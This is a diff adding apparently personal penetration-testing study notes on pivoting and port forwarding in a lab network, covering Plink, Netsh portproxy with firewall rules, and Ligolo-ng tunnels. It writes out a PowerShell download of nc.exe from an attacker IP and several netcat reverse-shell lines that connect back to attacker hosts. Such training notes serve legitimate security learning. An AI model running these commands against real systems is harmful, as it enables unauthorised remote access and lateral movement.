@@ -335,3 +335,207 @@ Now that the configuration file is pointing at our remote dynamic port forward S
 ```bash
 kali@kali:~$ proxychains psql -h 10.4.50.215 -U postgres  
 ```
+
+### Port Forwarding with Windows Tools
+
+On Windows versions with SSH installed, we will find scp.exe, sftp.exe, ssh.exe, along with other ssh-* utilities in %systemdrive%\Windows\System32\OpenSSH location by default.
+
+If the version of ssh is higher than 7.6, you can use it for remote dynamic port forwarding. You can check with "ssh.exe -V".
+
+#### Plink
+
+If ssh isn't installed on the machine, check if Plink is. Note that Plink can be used without a GUI, though remote dynamic port forwarding is not possible. Also note that there are alternatives to Plink.
+
+```bash
+sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
+...
+powershell wget -Uri http://192.168.45.182/nc.exe -OutFile C:\Windows\Temp\nc.exe
+...
+nc -lvnp 4446
+...
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.182 4446
+
+```
+
+This is a remote port forward, where we can access a remote machine's RDP port 3389 on our own loopback interface:
+
+**This might log our Kali password somewhere undesirable! If we're in a hostile network, we may wish to create a port-forwarding only user on our Kali machine for remote port forwarding situations.**
+
+```bash
+\c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+```
+
+**Much the same way that it's not possible to accept the SSH client key cache prompt from a non-TTY shell on Linux, with some very limited shells with Plink on Windows, we also won't be able to respond to this prompt. An easy solution in that case would be to automate the confirmation with cmd.exe /c echo y, piped into the plink.exe command. This will emulate the confirmation that we usually type when prompted. The entire command would be:**
+
+```bash
+cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw password -R 127.0.0.1:9833:127.0.0.1:3389 192.168.69.182
+```
+
+You can now RDP into the previously blocked RDP port:
+
+```bash
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+```
+
+**Local port forwards allow you to access what's on a remote machine's loopback on your own. Remote port forwarding allows you to access a remote machine's blocked port on your own loopback.**
+
+
+#### Netsh
+
+Native to Windows, typically used as a built-in firewall configurartion tool.
+
+Let's consider a slight modification of the previous scenario. MULTISERVER03 is serving its web application on TCP port 80 on the perimeter. CONFLUENCE01 is no longer accessible on the WAN interface. For simplicity, the firewall on MULTISERVER03 also allows inbound TCP port 3389, meaning we are able to log in over RDP directly.
+
+We want to SSH into PGDATABASE01 directly from our Kali machine. To do this, we'll need to create a port forward on MULTISERVER03 that will listen on the WAN interface and forward packets to the SSH port on PGDATABASE01.
+
+The portproxy subcontext of the netsh interface command requires administrative privileges to make any changes. This means that in most cases we will need to take UAC into account. In this example, we're running it in a shell over RDP using an account with administrator privileges, so UAC is not a concern. However, we should bear in mind that UAC may be a stumbling block in other setups.
+
+To start setting up a port forward, let's RDP directly into MULTISERVER03 from our Kali machine using xfreerdp again:
+
+```bash
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
+```
+
+In our RDP session, we can run cmd.exe as administrator to open a command window.
+
+Using this window, we can run Netsh. We'll instruct **netsh interface** to **add** a **portproxy** rule from an IPv4 listener that is forwarded to an IPv4 port (**v4tov4**). This will listen on port 2222 on the external-facing interface (**listenport=2222** **listenaddress=192.168.50.64**) and forward packets to port 22 on PGDATABASE01 (**connectport=22** **connectaddress=10.4.50.215**).
+
+```bash
+C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+
+C:\Windows\system32>
+```
+
+Although we don't receive any output from the command, we can confirm that port 2222 is listening using netstat.
+
+```bash
+C:\Windows\system32>netstat -anp TCP | find "2222"
+  TCP    192.168.50.64:2222     0.0.0.0:0              LISTENING
+
+C:\Windows\system32>
+```
+
+We can also confirm that the port forward is stored by issuing the show all command in the netsh interface portproxy subcontext.
+
+```bash
+C:\Windows\system32>netsh interface portproxy show all
+
+Listen on ipv4:             Connect to ipv4:
+
+Address         Port        Address         Port
+--------------- ----------  --------------- ----------
+192.168.50.64   2222        10.4.50.215     22
+```
+
+However, there's a problem. We can't connect to port 2222 from our Kali machine. You can check nmap to confirm:
+
+```bash
+sudo nmap -sS 192.168.50.64 -Pn -n -p2222
+```
+
+In order to access it, we need to poke a hole in the firewall on MULTISERVER03. *We'll also need to remember to plug that hole as soon as we're finished with it!*
+
+We can use the netsh advfirewall firewall subcontext to create the hole. We will use the add rule command and name the rule "port_forward_ssh_2222". We need to use a memorable or descriptive name, because we'll use this name to delete the rule later on.
+
+We'll allow connections on the local port (localport=2222) on the interface with the local IP address (localip=192.168.50.64) using the TCP protocol, specifically for incoming traffic (dir=in).
+
+```bash
+C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
+Ok.
+```
+
+The port is open! We can now SSH to port 2222 on MULTISERVER03, as though connecting to port 22 on PGDATABASE01.
+
+```bash
+kali@kali:~$ ssh database_admin@192.168.50.64 -p2222
+...
+database_admin@pgdatabase01:~$
+```
+
+Great! We're SSH'd into PGDATABASE01 through a port forward set up on MULTISERVER03 using Netsh.
+
+Using netsh advfirewall firewall, we can delete the rule, referencing it by its catchy name: "port_forward_ssh_2222":
+
+```bash
+C:\Users\Administrator>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+
+Deleted 1 rule(s).
+Ok.
+```
+
+We can also delete the port forward we created. This time we'll use the netsh interface subcontext to del the portproxy we created. We will reference the forwarding type (v4tov4) and the listenaddress and listenport we used when creating the rule, so Netsh can determine which rule to delete.
+
+```bash
+C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
+```
+
+Most Windows Firewall commands have PowerShell equivalents with commandlets like New-NetFirewallRule and Disable-NetFirewallRule. However, the netsh interface portproxy command doesn't. For simplicity, we've stuck with pure Netsh commands in this section. However, for a lot of Windows Firewall enumeration and configuration, PowerShell is extremely useful. You may wish to experiment with it while completing the exercises for this section.
+
+In this section, we created a port forward on Windows using the Netsh command. We also created a firewall rule to allow inbound traffic on our listening port. We used these in conjunction to create a working port forward from the WAN interface of MULTISERVER03 to the SSH server of PGDATABASE01.
+
+### Ligolo-ng
+
+```bash
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+/opt/proxy -selfcert
+```
+
+On the other machine:
+
+```bash
+agent.exe -connect 192.168.45.231:11601 -ignore-cert
+```
+
+On your machine:
+
+```bash
+session # select the session that you want to work with
+1
+```
+
+Add a rule to your iptables, another terminal windows:
+
+```bash
+sudo ip route add 172.16.147.0/24 dev ligolo
+ip route list # confirm
+nc -lvnp 4444
+```
+
+Back on the ligolo terminal:
+
+```bash
+start
+```
+
+In order to receive reverse shells from machines on the internal network:
+
+```bash
+listener-add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
+listener-list # confirm
+ifconfig # get the INTERNAL ip address, which will be used to communicate to your personal kali machine on the external network
+```
+
+On your internal Windows machine:
+
+```bash
+nc.exe 172.16.157.14 1234 -e cmd.exe
+```
+
+In order to transfer files from your machine to the internal server:
+
+In the ligolo terminal:
+
+```bash
+# Add another listener that directs to your server
+listener-add --addr 0.0.0.0:1235 --to 127.0.0.1:8000
+```
+
+You may need to create certificates:
+
+```bash
+mkdir -p ~/Downloads/certs
+cd ~/Downloads/certs
+openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout key.pem -out cert.pem
+```
